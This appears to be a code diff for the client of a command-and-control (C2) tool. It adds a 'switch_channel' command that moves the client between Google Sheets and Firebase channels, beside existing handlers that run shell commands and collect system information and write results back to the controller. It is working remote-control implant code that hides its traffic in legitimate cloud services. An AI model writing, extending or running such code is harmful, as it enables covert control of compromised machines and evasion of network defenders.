@@ -122,6 +122,32 @@ def handle_shell(payload):
         return {"error": str(e)}
 
 
+def handle_switch_channel(payload):
+    """Switch the active C2 channel. ACK is written on the old channel before switching."""
+    channel = payload.get("channel", "").strip().lower()
+    if channel not in ("sheets", "firebase"):
+        return {"error": f"unknown channel: {channel!r}. supported: sheets, firebase"}
+    old = os.environ.get("CHANNEL", "sheets")
+    if old == channel:
+        return {"switched_to": channel, "previous": old, "note": "already on this channel"}
+    # Signal the main loop to switch AFTER writing the result on the current channel.
+    # _deferred_switch is hoisted out of the result JSON in dispatch() so it is not
+    # sent to the server as part of the result payload.
+    return {"_deferred_switch": channel, "switched_to": channel, "previous": old}
+
+
+def _apply_channel_switch(channel_name):
+    """Activate a new channel — updates env var and common._active_channel."""
+    if channel_name == "firebase":
+        from channel.firebase import FirebaseChannel
+        common.set_channel(FirebaseChannel())
+    else:
+        from channel.sheets import SheetsChannel
+        common.set_channel(SheetsChannel())
+    os.environ["CHANNEL"] = channel_name
+    print(f"[client] Channel switched → {channel_name}")
+
+
 def handle_config(payload):
     """Update client config with only known keys. In-memory only — resets on restart."""
     updated = {}
@@ -143,10 +169,11 @@ def handle_config(payload):
 
 
 HANDLERS = {
-    "system_info": handle_system_info,
-    "echo": handle_echo,
-    "shell": handle_shell,
-    "config": handle_config,
+    "system_info":    handle_system_info,
+    "echo":           handle_echo,
+    "shell":          handle_shell,
+    "config":         handle_config,
+    "switch_channel": handle_switch_channel,
 }
 
 
@@ -173,6 +200,12 @@ def dispatch(task):
             result_data = {"error": str(e)}
             status = "error"
 
+    # Hoist _deferred_switch out of result_data so it is not JSON-encoded into the
+    # result payload. The main loop reads it from data after writing the result.
+    deferred_switch = None
+    if isinstance(result_data, dict):
+        deferred_switch = result_data.pop("_deferred_switch", None)
+
     client_id = _client_config.get("client_id", _get_username())
     result_str = json.dumps(result_data)
     data = {
@@ -189,6 +222,9 @@ def dispatch(task):
     if len(chunks) > 1:
         frags = common.build_outbox_fragments(data, chunks)
         data["_fragments"] = frags  # carry fragments for main loop to handle
+
+    if deferred_switch:
+        data["_deferred_switch"] = deferred_switch  # carry for main loop to apply after write
 
     return data
 
@@ -289,6 +325,7 @@ def main():
             print(f"[info] executing command {tid} ({task.get('command')})")
             result = dispatch(task)
             frags = result.pop("_fragments", None)
+            deferred_switch = result.pop("_deferred_switch", None)
 
             if frags:
                 ok = common.write_form(frags[0])
@@ -307,6 +344,10 @@ def main():
                     print(f"[info] command {tid} done, result written")
                 else:
                     print(f"[warn] command {tid} result write failed — result lost")
+
+            # Apply channel switch AFTER writing the ACK on the old channel
+            if deferred_switch:
+                _apply_channel_switch(deferred_switch)
 
         # Sleep using current _client_config (may have been updated by a config command)
         try:
